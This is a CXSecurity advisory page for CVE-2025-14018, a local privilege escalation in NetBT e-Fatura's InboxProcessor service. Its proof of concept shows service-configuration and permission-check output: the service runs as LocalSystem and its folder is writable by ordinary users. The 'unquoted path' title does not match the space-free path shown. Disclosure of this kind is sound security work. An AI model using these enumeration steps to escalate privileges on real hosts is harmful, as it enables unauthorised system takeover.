---
title: NetBT e-Fatura 'InboxProcessor' Unquoted Service Path Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2025120010
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-12-14
fetch_date: 2025-12-15T03:27:06.627474
---

# NetBT e-Fatura 'InboxProcessor' Unquoted Service Path Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NetBT e-Fatura 'InboxProcessor' Unquoted Service Path Privilege Escalation** **2025.12.14**  Credit:  **[Seccops](https://cxsecurity.com/author/Seccops/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2025-14018](https://cxsecurity.com/cveshow/CVE-2025-14018/ "Click to see CVE-2025-14018")**  CWE: **[CWE-428](https://cxsecurity.com/cwe/CWE-428 "Click to see CWE-428")** | |

# Exploit Title: NetBT e-Fatura 'InboxProcessor' Unquoted Service Path Privilege Escalation
# Author: Seccops
# Discovery Date: 2025-10-03
# Vendor: https://net-bt.com.tr/e-fatura/
# Tested Version: 2024
# Tested on OS: Microsoft Windows Server 2019 DC
# Vulnerability Type: CWE-428 Unquoted Search Path or Element
# CVE: CVE-2025-14018
Note: Thanks "Levent Sungu" for providing the testing environment.
====================
Description & Impact
====================
This vulnerability allows an unauthorized local user to execute arbitrary code with high privileges on the system.
================
Proof of Concept
================
C:\Users\efatura>sc qc InboxProcessor
[SC] QueryServiceConfig SUCCESS
SERVICE\_NAME: InboxProcessor
TYPE : 10 WIN32\_OWN\_PROCESS
START\_TYPE : 2 AUTO\_START
ERROR\_CONTROL : 1 NORMAL
BINARY\_PATH\_NAME : C:\inetpub\wwwroot\InboxProcessor\Netbt.Inbox.Process.exe
LOAD\_ORDER\_GROUP :
TAG : 0
DISPLAY\_NAME : InboxProcessor
DEPENDENCIES :
SERVICE\_START\_NAME : LocalSystem
C:\Users\efatura\Desktop>accesschk.exe /accepteula -uwdq "C:\inetpub\wwwroot\InboxProcessor\"
Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com
C:\inetpub\wwwroot\InboxProcessor
RW BUILTIN\Users
RW NT SERVICE\TrustedInstaller
RW NT AUTHORITY\SYSTEM
RW BUILTIN\Administrators

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025120010)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top